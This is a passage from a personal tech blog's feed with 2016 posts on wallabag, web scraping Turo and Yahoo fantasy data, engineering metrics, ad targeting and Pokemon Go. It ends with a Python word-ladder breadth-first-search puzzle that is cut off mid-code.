      <img src="http://dangoldin.com/assets/static/images/fridge-2.jpg" alt="Fridge 2" width="600" height="800" layout="responsive"/>
      
<figure class="highlight"><pre><code class="language-json" data-lang="json"><span class="p">[</span><span class="w">
        </span><span class="p">{</span><span class="w">
          </span><span class="nl">"score"</span><span class="p">:</span><span class="w"> </span><span class="mf">0.87785435</span><span class="p">,</span><span class="w">
          </span><span class="nl">"mid"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/m/07yv9"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"description"</span><span class="p">:</span><span class="w"> </span><span class="s2">"vehicle"</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="w">
          </span><span class="nl">"score"</span><span class="p">:</span><span class="w"> </span><span class="mf">0.78110605</span><span class="p">,</span><span class="w">
          </span><span class="nl">"mid"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/m/0k5j"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"description"</span><span class="p">:</span><span class="w"> </span><span class="s2">"aircraft"</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="w">
          </span><span class="nl">"score"</span><span class="p">:</span><span class="w"> </span><span class="mf">0.77443254</span><span class="p">,</span><span class="w">
          </span><span class="nl">"mid"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/m/0cmf2"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"description"</span><span class="p">:</span><span class="w"> </span><span class="s2">"airplane"</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="w">
          </span><span class="nl">"score"</span><span class="p">:</span><span class="w"> </span><span class="mf">0.7131173</span><span class="p">,</span><span class="w">
          </span><span class="nl">"mid"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/m/02pkr5"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"description"</span><span class="p">:</span><span class="w"> </span><span class="s2">"plumbing fixture"</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="w">
          </span><span class="nl">"score"</span><span class="p">:</span><span class="w"> </span><span class="mf">0.71218145</span><span class="p">,</span><span class="w">
          </span><span class="nl">"mid"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/m/015y8h"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"description"</span><span class="p">:</span><span class="w"> </span><span class="s2">"jet aircraft"</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="w">
          </span><span class="nl">"score"</span><span class="p">:</span><span class="w"> </span><span class="mf">0.66169083</span><span class="p">,</span><span class="w">
          </span><span class="nl">"mid"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/m/06ht1"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"description"</span><span class="p">:</span><span class="w"> </span><span class="s2">"room"</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="w">
          </span><span class="nl">"score"</span><span class="p">:</span><span class="w"> </span><span class="mf">0.5944497</span><span class="p">,</span><span class="w">
          </span><span class="nl">"mid"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/m/01lgkm"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"description"</span><span class="p">:</span><span class="w"> </span><span class="s2">"recreational vehicle"</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="w">
          </span><span class="nl">"score"</span><span class="p">:</span><span class="w"> </span><span class="mf">0.54411179</span><span class="p">,</span><span class="w">
          </span><span class="nl">"mid"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/m/041x_j"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"description"</span><span class="p">:</span><span class="w"> </span><span class="s2">"public toilet"</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="w">
          </span><span class="nl">"score"</span><span class="p">:</span><span class="w"> </span><span class="mf">0.53394085</span><span class="p">,</span><span class="w">
          </span><span class="nl">"mid"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/m/017_cz"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"description"</span><span class="p">:</span><span class="w"> </span><span class="s2">"major appliance"</span><span class="w">
        </span><span class="p">}</span><span class="w">
      </span><span class="p">]</span></code></pre></figure>


    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/fridge-3.jpg" alt="Fridge 3" width="600" height="800" layout="responsive"/>
      
<figure class="highlight"><pre><code class="language-json" data-lang="json"><span class="p">[</span><span class="w">
        </span><span class="p">{</span><span class="w">
          </span><span class="nl">"score"</span><span class="p">:</span><span class="w"> </span><span class="mf">0.78413528</span><span class="p">,</span><span class="w">
          </span><span class="nl">"mid"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/m/02phwj2"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"description"</span><span class="p">:</span><span class="w"> </span><span class="s2">"display window"</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="w">
          </span><span class="nl">"score"</span><span class="p">:</span><span class="w"> </span><span class="mf">0.647836</span><span class="p">,</span><span class="w">
          </span><span class="nl">"mid"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/m/02rfdq"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"description"</span><span class="p">:</span><span class="w"> </span><span class="s2">"interior design"</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="w">
          </span><span class="nl">"score"</span><span class="p">:</span><span class="w"> </span><span class="mf">0.59498113</span><span class="p">,</span><span class="w">
          </span><span class="nl">"mid"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/m/0c_jw"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"description"</span><span class="p">:</span><span class="w"> </span><span class="s2">"furniture"</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="w">
          </span><span class="nl">"score"</span><span class="p">:</span><span class="w"> </span><span class="mf">0.57692927</span><span class="p">,</span><span class="w">
          </span><span class="nl">"mid"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/m/0191_7"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"description"</span><span class="p">:</span><span class="w"> </span><span class="s2">"retail store"</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="w">
          </span><span class="nl">"score"</span><span class="p">:</span><span class="w"> </span><span class="mf">0.54954523</span><span class="p">,</span><span class="w">
          </span><span class="nl">"mid"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/m/08790l"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"description"</span><span class="p">:</span><span class="w"> </span><span class="s2">"boutique"</span><span class="w">
        </span><span class="p">}</span><span class="w">
      </span><span class="p">]</span></code></pre></figure>

    </div>
  </li>
</ul>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Giving wallabag a shot</title>
   <link href="http://dangoldin.com/2016/08/28/giving-wallabag-a-shot/"/>
   <updated>2016-08-28T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2016/08/28/giving-wallabag-a-shot</id>
   <content:encoded><![CDATA[
<p>I’ve been a happy Instapaper user for years but the news that it was being acquired by Pinterest got me thinking about some alternatives. Not because I have anything against Pinterest; in fact I think this is a great fit and they’ll be able to complement each other but because it’s a reminder that no third party product is guaranteed to last and I wanted to see what open source alternatives are out there.</p>

<p>I discovered <a href="https://www.wallabag.org/">wallabag</a> and got it setup earlier today. The documentation to install and get it running was incredibly straightforward and I was able to get it operational within an hour. Unfortunately it took a bit of wrestling to understand the various configuration options and I’m still unable to get it working across both the web and an iPhone. There’s a series of steps you need to do - from generating a unique RSS token to setting up an oAuth application that make it difficult to just get up and running. I understand that it’s designed for developers and offers a ton of customization but it should be simpler to get get the base installation - every user would want an extension to easily add articles and a way to access them offline on a phone and automatically generating the necessary settings would make it much easier to get started.</p>

<p>Trying out an open source alternatives is an eye-opening experience. You don’t realize how much polish it takes to build something usable. We love claiming that we can build anything in a day but it’s the relentless polishish that makes a successful product. I suspect this is why it’s incredibly hard to find open source products that require a cross platform approach. It’s difficult to think of successful open source applications that span across multiple environments. That requires multiple developers each agreeing on a unified vision and then making sure each of the components fits together. This is a tough combination and may be why so many popular open source projects are incredibly focused: it’s a lot easier to get multiple people working on a single product when it’s simple and they all share the same pain. But as soon as the scope expands there’s no single vision holding everything together and it shows in the final product.</p>

<p>The nice thing about open source is that anyone can add functionality and I’m already thinking of ways to improve wallabag. Hopefully I’ll have some time over the next few weeks.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Writing scrapers as APIs</title>
   <link href="http://dangoldin.com/2016/08/24/writing-scrapers-as-apis/"/>
   <updated>2016-08-24T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2016/08/24/writing-scrapers-as-apis</id>
   <content:encoded><![CDATA[
<p>While building the <a href="http://dangoldin.com/2016/08/21/downloading-your-turo-ride-history/">Turo scraper</a> I became annoyed that there was no API to make my job significantly easier. Then I wouldn’t have had to go through a variety of hoops and iterations to get the data I needed and would also not have to worry about changes to their page design breaking the script. This got me thinking about an idea to write my scraper in such a way that it’s exposed as an API. In that case I can architect the code so that the retrieval and manipulation of the ride data is completely separate from the scraping code. Then if and when Turo does decide to release an official API all I’d need to do is swap my unofficial implementation out for the official one.</p>

<p>This chain of thought led to me to the challenges of building this on the engineering side. There’s something neat about being able to specify a bit of data through a series of steps. For example, to get the details for a ride the steps may be: 1) login to Turo, 2) navigate to that ride’s receipt page, 3) parse the details, 4) return them as JSON. Another API endpoint may be to retrieve all the rides. This one would be 1) login to Turo, 2) navigate to the first page, 3) fetch all the rides, 4) if there’s a next page, go to it and repeat step 3, otherwise 5) return the list of rides as JSON. For almost every request the first and last steps will be the same but the intermediate step will vary. This becomes even more interesting since we can now start to think about caching the results at the intermediate levels so you can avoid the steps if you’ve already done them in the past. This way we’re incrementally building a “shadow” version of the site and use that for everything we need but keep augmenting it when needed.</p>

<p>Pushing this further we can imagine a scraping specific language that represents the steps involved during a scraping session. The goal here is to replace the code that does the DOM traversal and instead come up with a cleaner and more expressive way that can be applied through code. Sometimes the application will be going to our cache but other times it will require actually navigating to the appropriate page.</p>

<p>I’m excited to try this approach out since it turns a rote scraping exercise into a higher order solution that can scale to other scraping jobs. I only wish I thought of it sooner since by the time I went down this rabbit hole I was mostly done with the actual code so I’ll have to give this a shot on the next scraping job.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Downloading your Turo ride history</title>
   <link href="http://dangoldin.com/2016/08/21/downloading-your-turo-ride-history/"/>
   <updated>2016-08-21T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2016/08/21/downloading-your-turo-ride-history</id>
   <content:encoded><![CDATA[
<p>I’ve been using <a href="https://turo.com/">Turo</a> to rent our car out for the past couple of months and have been using a simple spreadsheet to track the revenue. Being a lazy engineer doing this manually became a bit tiresome so I finally automated it. Unfortunately Turo does not have a simple way of downloading the data and there’s no open API so I had to resort my usual solution: <a href="https://github.com/dangoldin/turo-automation">scraping</a>. Luckily for me I just came off of updating my Yahoo fantasy football scraping script and was ready to do the same for Turo.</p>

<p>The entire process took a few hours and the <a href="https://github.com/dangoldin/turo-automation">result</a> is decent - it goes through every one of your completed trips and scrapes the receipt page for the total paid, total earned, the various reimbursements, and the start and end times. As of this writing it still doesn’t handle cancelled trips or trips that have not yet been taken. Another thing I noticed when writing the script is that Turo changed the representation of a trip - some of the older receipts had reimbursements in a different section from the newer ones so that needs a bit of tweaking. I’m sure there are some other edge cases I’m not handling properly since I could only code against the data I have; if it ends up not working for you let me know and I’ll see what I can do.</p>

<p>The process to build the scraper was standard: use Chrome’s source inspector to examine the structure of the page and then try using a few different selectors in an interactive Python section running <a href="http://www.seleniumhq.org/">Selenium</a> to see whether they worked as expected. Once I had the various selectors and code figured it out it took a little bit of refactoring to get into a somewhat clean state.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Integrating poorly documented Open Source libraries</title>
   <link href="http://dangoldin.com/2016/08/14/integrating-poorly-documented-open-source-libraries/"/>
   <updated>2016-08-14T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2016/08/14/integrating-poorly-documented-open-source-libraries</id>
   <content:encoded><![CDATA[
<p>Open source is great: if you find the right library you’re able to save a ton of time and get code that’s been through the gauntlet that you can confidently incorporate into your system. Unfortunately many open source libraries are partially baked with documentation that doesn’t always accompany the rapid development of the code. This leads developers to repeatedly cross reference their code with some archaic documentation and then wonder why it’s not working as expected. This is proportional to the obscurity of the library - popular libraries will have most of their kinks worked out but esoteric ones that are likely maintained by one person won’t have the polish.</p>

<p>Yet it would be nice to take one of these libraries and build off of it. The simple answer is to reach out to the maintainer and ask questions. I always get excited when someone reaches out with a question about how to use one of my open source libraries; I’m not at that scale where this is burdensome and it’s encouraging that someone is actually using my code. When this doesn’t work a neat trick is to <a href="https://github.com/search">search GitHub</a> for usage of that code. Most documentation provides a simple starting tutorial and assumes the user can take it from there. More often than not this doesn’t work well and you have to look at the source code to understand how the code works, what arguments the methods expects, and the order in which they should be called. By looking at actual usage of the code you can see how others have integrated these libraries in actual applications rather than toy examples. This works incredibly well for open source libraries in that middle area where they’re not popular enough to have everything figured out yet are useful enough to have had numerous developers wrangle them into their code. Many new and popular libraries fall into this bucket so if you want to use code that’s just becoming popular leveraging GitHub’s code search is a great way to start.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Fantasy football stats: 2016-2017 edition</title>
   <link href="http://dangoldin.com/2016/08/13/fantasy-football-stats-2016-2017-edition/"/>
   <updated>2016-08-13T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2016/08/13/fantasy-football-stats-2016-2017-edition</id>
   <content:encoded><![CDATA[
<p>This is an annual tradition now but I just updated my old script that crawls and extracts the projected fantasy football data from Yahoo to work with the 2016-2017 season. The changes were incredibly minor: Yahoo broke the the login page into two steps and there was a minor change in the order of the columns. Both of these were trivial to implement and the code is up on <a href="https://github.com/dangoldin/yahoo-ffl">GitHub</a>. If all you care about is the raw data you can just download the <a href="https://raw.githubusercontent.com/dangoldin/yahoo-ffl/master/stats-2017.csv">CSV</a>.</p>

<p>Every year I intend to use the data to come up with a drafting algorithm yet I’ve failed to do anything with it over the past couple of years. I’m hoping this year is different.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Consumer tech leads to cyborgs</title>
   <link href="http://dangoldin.com/2016/08/08/consumer-tech-leads-to-cyborgs/"/>
   <updated>2016-08-08T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2016/08/08/consumer-tech-leads-to-cyborgs</id>
   <content:encoded><![CDATA[
<p>The iPhone is the top selling consumer product of all time and a variety of podcasts and articles makes it seem that this is the peak of consumer technology and we’ll never see anything as popular. This is shortsighted. Every new technology achieved wider and wider adoption and eclipsed the previous generation - <a href="http://ben-evans.com/benedictevans/2014/4/25/ipad-growth">laptops eclipsed desktops and smartphones eclipsed laptops</a>. One thing that’s clear is that each generation of tech gets closer and closer to us. Initially we were exposed to computers when we went into the office. Soon we started buying desktops for our homes. After that we decided we wanted laptops that we could carry around with us. Smartphones gave us the ability to carry computers around in our pockets with a full day’s worth of charge.</p>

<p>Smartwatches aren’t very popular now but cellular connectivity may make them even more popular than smartphones. The interactions and designs will need to improve to handle the novel form factor but that itself is an opportunity to get closer to to the senses other than sight. Smartphones we carry but smartwatches we wear. Beyond smartwatches we may end up with technology that gets us closer and closer to becoming cyborgs. At this point we get very close to sci-fi territory with chips that are implanted under our skins or technology that can interface directly with our brains. At that point I can’t even imagine what sci-fi novels will be - everything will seem possible.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Engineering management: Measuring the unmeasurable</title>
   <link href="http://dangoldin.com/2016/08/07/engineering-management-measuring-the-unmeasurable/"/>
   <updated>2016-08-07T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2016/08/07/engineering-management-measuring-the-unmeasurable</id>
   <content:encoded><![CDATA[
<p>A key part of management is getting out of the way and building out processes that help your team be as productive as possible. At the same time, you can’t change what you can’t measure. Combining these two makes it clear that to improve, whether people or process, you need to start measuring and tracking the appropriate metrics.</p>

<p>In software engineering, some things are easy to track: how many bugs there are, how quickly they’re resolved, how much code are written - but rarely tell the whole story and may lead to perverse incentives. The common example is measuring developer productivity through number of lines of code written: a smart developer would purposefully write verbose and long winded code to get their metric up.</p>

<p>Then there are the items that are hard to measure but actually drive productivity: improvement as an engineer, simple and expressive code, code that’s easily changed. These are incredibly difficult to measure, especially at scale, but if you’re able to focus on improving these you’ve found the holy grail.</p>

<p>By being creative it’s possible to come up with proxy metrics and approximations despite not being able to find easy ways of measuring the actual performance drivers. Think of these as traits that productive teams have and should be encouraged. There will always be exceptions and many are susceptible to gaming but they’re much better than nothing.</p>

<p>Besides the usual suspects (velocity, bugs, test coverage), I plan on tracking the following proxy metrics. Individually they don’t tell the whole story but taken together I hope they’ll be a good way to help improve the productivity of an engineering team. Note that a requirement for these was that they would be easy to collect, ideally automated.</p>

<ul>
  <li>Pull request size: I believe pull requests should be as small as they can be. Larger pull requests are harder to code review and carry more risk.</li>
  <li>Pull request file variance: Not a 100% sure about this one but I suspect there’s a difference in pull requests that are isolated to a small set of files rather than dozens. It may indicate that our code is not as cleanly laid out or architected as it should be and may be worth cleaning up.</li>
  <li>Pull request activity: Another soft one but I want to see whether the amount of comments and changes a pull request has carries any meaning. I think junior engineers tend to have more feedback on their code versus more senior developers and measuring this may be a good way of discovering that. The challenge is that this one is easily gamed and we should all want to encourage discussion of code in order to come up with as high quality code as we can.</li>
  <li>Deploy frequency: The more we deploy the more useful code makes it out into the real world and we should strive to deploy as often as we can while maintaining a high quality bar. We’re not at continuous deployment yet but hopefully this will help us get there.</li>
</ul>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>One of my favorite programs</title>
   <link href="http://dangoldin.com/2016/08/06/one-of-my-favorite-programs/"/>
   <updated>2016-08-06T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2016/08/06/one-of-my-favorite-programs</id>
   <content:encoded><![CDATA[
<p>While working on a <a href="/2016/07/17/coding-puzzle-word-transformation-through-valid-words/">small programming puzzle</a> I remembered Peter Norvig’s <a href="http://norvig.com/spell-correct.html">spell checker</a> and how blown away I was after seeing it for the first. It’s one of my favorite examples of code that’s clean and elegant while being extremely expressive and powerful. If you haven’t seen it yet I encourage you take a look and step through it since he does a much better job of explaining both the code and theory than I ever could.</p>

<p>I don’t want to attribute my improvement as a coder to a single program but this program forced me to think much deeper about the code I write and provided a glimpse of good code. It serves as a goal and pushes me to be more aware of the code I write and whether it’s as simple and expressive as it can be. It’s not easy but approaching development through a lens of self improvement has been instrumental in helping me become a better coder. Good programmers are never happy with the code they wrote a year ago which is a sure sign that they’ve improved over the past year. Dissatisfaction is what drives people to improve and code is no different. It’s rare to find code that’s shocking in its brilliance and I’d love to see more examples so please share.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Smarter geographic ad targeting</title>
   <link href="http://dangoldin.com/2016/07/26/smarter-geographic-ad-targeting/"/>
   <updated>2016-07-26T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2016/07/26/smarter-geographic-ad-targeting</id>
   <content:encoded><![CDATA[
<p>Targeting is one of the best ways to improve the return on an advertising campaign. By identifying potential customers you’re able to focus your advertising on them rather than someone random. And one of the best simplest ways is to set up your advertising campaigns to focus on a specific geography. Maybe your product is only sold in the United States and advertising it elsewhere is a waste. Or maybe your product is sold everywhere but the messaging and copy needs to vary by region. Or maybe it’s sold everywhere with the same exact copy but the price varies by region. Being able to change your campaigns by geography is a simple way to improve the performance of any campaign.</p>

<div class="right10">
  <img src="http://dangoldin.com/assets/static/images/dodge-ram-canada.png" alt="Dodge Ram in Canada" width="250" height="427" layout="responsive"/>
</div>

<p>Yet most geographic targeting is dumb. Earlier today I was on Twitter and noticed an ad for a Dodge Ram sponsored by Ram Trucks Canada. It’s true that I’m on vacation in Canada but it’s definitely not the case that I’ll be buying a car in Canada. The solution to this isn’t complicated. Every social network should have a good idea of my patterns and where home and work are. And if I’m outside those areas it should be easy to determine whether it’s a quick trip out of town or a longer vacation. For all I know these platforms have this information but they should be exposing it to advertisers. Of course these inaccurate mismatches are a tiny percentage of the total advertising spend but it adds up and more importantly having more fleshed out profiles will improve the ad optimization.</p>

<p>Imagine being able to determine whether someone drives to work or takes the train. Every heavily used social network has the data to derive this but I suspect few have. We’re already placed in various customer segments based on our behavioral and consumption history yet geography is still assumed to be the current location. I suspect the more advanced companies are using geographic information to craft better profiles but I’d love to see this opened up to advertisers.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Double down on your brand and IP</title>
   <link href="http://dangoldin.com/2016/07/22/double-down-on-your-brand-and-ip/"/>
   <updated>2016-07-22T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2016/07/22/double-down-on-your-brand-and-ip</id>
   <content:encoded><![CDATA[
<p>Pokemon Go is huge right now. People across all age ranges, demographics, and geographies are getting involved and it’s hard to imagine this sort of adoption for any other game. What I find fascinating is that Pokemon Go was based on the same augmented reality mechanics as Ingress, another game developed by Niantic Labs. Ingress has a loyal following but pales in comparison against Pokemon Go when looking at the user numbers, despite Pokemon Go being less than 2 weeks old while Ingress has been around for almost 4 years.</p>

<p>The Pokemon brand has a huge following and it’s incredible what a strong brand can do in the modern world. With zero distribution costs and instant global reach an existing brand can grow faster than at any previous point. Now more than ever do brands matters. Modern technology has made it easier than ever to enter new markets and quickly launch apps but in this world of commoditization and heavy competition a strong brand can do wonders.</p>

<p>The companies best positioned to take advantage of this new world are the ones with strong intellectual property and brands that can leverage whatever innovation comes along. Right now it’s augmented reality but in the future it will be something else. The business will be adapting new innovations that allow companies to magnify and enhance their brands.</p>

<p>This model reminds me of the pharmaceutical industry. I started my professional career working for a pharmaceutical consulting company which gave me a crash course in how the industry works. One of the more interesting insights was that the biggest advantage large pharmaceutical companies have is their sales force rather than their R&amp;D. This allows them to just acquire small biotech companies for their newly developed drugs and have their own sales force selling it. This approach makes sense - you find what you’re great at and focus on applying that as much as you can. This is what Nintendo is doing with Pokemon Go and every brand with global scale IP should be doing.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Coding puzzle: Word transformation through valid words</title>
   <link href="http://dangoldin.com/2016/07/17/coding-puzzle-word-transformation-through-valid-words/"/>
   <updated>2016-07-17T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2016/07/17/coding-puzzle-word-transformation-through-valid-words</id>
   <content:encoded><![CDATA[
<p>A fun engineering puzzle I heard this week was to write an algorithm that finds the shortest path between two words of the same length where you’re only allowed to change a single letter each step and every word needs to be valid. This morning I decided to have some fun with it and wanted to jot down my thought process going through the exercise in the hope that it provides a bit of perspective on how I approach code.</p>

<p>The first step was to just do an example in my head to visualize the problem. I started with two short words, dog and cat, and went through the manual transition. The optimal solution is where each letter changed is the final letter - in the case of dog to cat it was simply dog -&gt; dot -&gt; cot -&gt; cat. Now that I had a baseline (and a test), I decided to dive into the actual code.</p>

<p>The immediate realization was that since this was asking for the shortest path I’d need to do a breadth first search, something I haven’t had to touch since some early job interviews. The other realization was that the graph would need to be constructed on the fly. With these two in mind I dove right in.</p>

<p>I broke the problem down into three parts - one was loading the dictionary, two was writing a function that would get the “adjacent” words, and three was doing the search itself. The first function was straightforward since I just loaded in the built in OS X dictionary:</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">load_dictionary</span><span class="p">(</span><span class="n">path</span> <span class="o">=</span> <span class="s">'/usr/share/dict/words'</span><span class="p">):</span>
  <span class="n">dictionary</span> <span class="o">=</span> <span class="nb">set</span><span class="p">()</span>
  <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'/usr/share/dict/words'</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">f</span><span class="p">:</span>
      <span class="n">dictionary</span><span class="p">.</span><span class="n">add</span><span class="p">(</span><span class="n">line</span><span class="p">.</span><span class="n">strip</span><span class="p">().</span><span class="n">lower</span><span class="p">())</span>
  <span class="k">return</span> <span class="n">dictionary</span></code></pre></figure>

<p>While thinking about the adjacent word function I thought back to <a href="http://norvig.com/spell-correct.html">Peter Norvig’s spell checker</a> and remembered how simple yet powerful it was (if you haven’t seen it yet you should take a look - one of the most elegant code examples I’ve seen). All his code needed was a tiny tweak to filter the list of generated words to those in the dictionary.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">adjacent_words</span><span class="p">(</span><span class="n">word</span><span class="p">,</span> <span class="n">alphabet</span><span class="p">):</span>
  <span class="n">splits</span> <span class="o">=</span> <span class="p">[(</span><span class="n">word</span><span class="p">[:</span><span class="n">i</span><span class="p">],</span> <span class="n">word</span><span class="p">[</span><span class="n">i</span><span class="p">:])</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">word</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)]</span>
  <span class="n">replaces</span> <span class="o">=</span> <span class="p">[</span><span class="n">a</span> <span class="o">+</span> <span class="n">c</span> <span class="o">+</span> <span class="n">b</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span> <span class="k">for</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">splits</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">alphabet</span> <span class="k">if</span> <span class="n">b</span><span class="p">]</span>
  <span class="k">return</span> <span class="p">[</span><span class="n">r</span> <span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="n">replaces</span> <span class="k">if</span> <span class="n">r</span> <span class="ow">in</span> <span class="n">dictionary</span><span class="p">]</span></code></pre></figure>

<p>Now it was time to do the actual search which took me a bit of time. I knew the theory but it took me a bit of time to translate it into code. And even then I wasn’t happy with how it looked so ended up finding a pretty simple <a href="http://eddmann.com/posts/depth-first-search-and-breadth-first-search-in-python/">Python implementation</a>.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">bfs_paths</span><span class="p">(</span><span class="n">source</span><span class="p">,</span> <span class="n">target</span><span class="p">,</span> <span class="n">dictionary</span><span class="p">,</span> <span class="n">alphabet</span><span class="p">):</span>
  <span class="n">queue</span> <span class="o">=</span> <span class="n">deque</span><span class="p">(((</span><span class="n">source</span><span class="p">,</span> <span class="p">[</span><span class="n">source</span><span class="p">]),))</span>
  <span class="k">while</span> <span class="n">queue</span><span class="p">:</span>
    <span class="n">v</span><span class="p">,</span> <span class="n">path</span> <span class="o">=</span> <span class="n">queue</span><span class="p">.</span><span class="n">popleft</span><span class="p">()</span>
    <span class="k">for</span> <span class="n">n</span> <span class="ow">in</span> <span class="p">[</span><span class="n">w</span> <span class="k">for</span> <span class="n">w</span> <span class="ow">in</span> <span class="n">adjacent_words</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="n">alphabet</span><span class="p">)</span> <span class="k">if</span> <span class="n">w</span> <span class="ow">not</span> <span class="ow">in</span> <span class="nb">set</span><span class="p">(</span><span class="n">path</span><span class="p">)]:</span>
      <span class="k">if</span> <span class="n">n</span> <span class="o">==</span> <span class="n">target</span><span class="p">:</span>
        <span class="k">yield</span> <span class="n">path</span> <span class="o">+</span> <span class="p">[</span><span class="n">n</span><span class="p">]</span>
      <span class="k">else</span><span class="p">:</span>
        <span class="n">queue</span><span class="p">.</span><span class="n">append</span><span class="p">((</span><span class="n">n</span><span class="p">,</span> <span class="n">path</span> <span class="o">+</span> <span class="p">[</span><span class="n">n</span><span class="p">]))</span></code></pre></figure>

<p>The last part was cleaning up the code and improving its efficiency. The key parts here were using string.lowercase as the universe of letters, replacing a standard list with a collections.dequeue to significantly speed up the “pop” operation, and making the dictionary and alphabet variables locally scoped. As a final test I ran through the dog to cat example and got two additional transformations: dog-&gt;cog-&gt;cag-&gt;cat and dog-&gt;cog-&gt;cot-&gt;cat. The complete code is below but note that I left it open-ended so it will print every path it finds rather than just the shortest one.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/env python
</span>
<span class="kn">import</span> <span class="nn">string</span>
<span class="kn">from</span> <span class="nn">collections</span> <span class="kn">import</span> <span class="n">deque</span>

<span class="k">def</span> <span class="nf">load_dictionary</span><span class="p">(</span><span class="n">path</span> <span class="o">=</span> <span class="s">'/usr/share/dict/words'</span><span class="p">):</span>
  <span class="n">dictionary</span> <span class="o">=</span> <span class="nb">set</span><span class="p">()</span>
  <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'/usr/share/dict/words'</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">f</span><span class="p">:</span>
      <span class="n">dictionary</span><span class="p">.</span><span class="n">add</span><span class="p">(</span><span class="n">line</span><span class="p">.</span><span class="n">strip</span><span class="p">().</span><span class="n">lower</span><span class="p">())</span>
  <span class="k">return</span> <span class="n">dictionary</span>

<span class="c1"># Peter Norvig's spellcheck code is amazing:
# http://norvig.com/spell-correct.html
# Just use the replace part of it
</span><span class="k">def</span> <span class="nf">adjacent_words</span><span class="p">(</span><span class="n">word</span><span class="p">,</span> <span class="n">alphabet</span><span class="p">):</span>
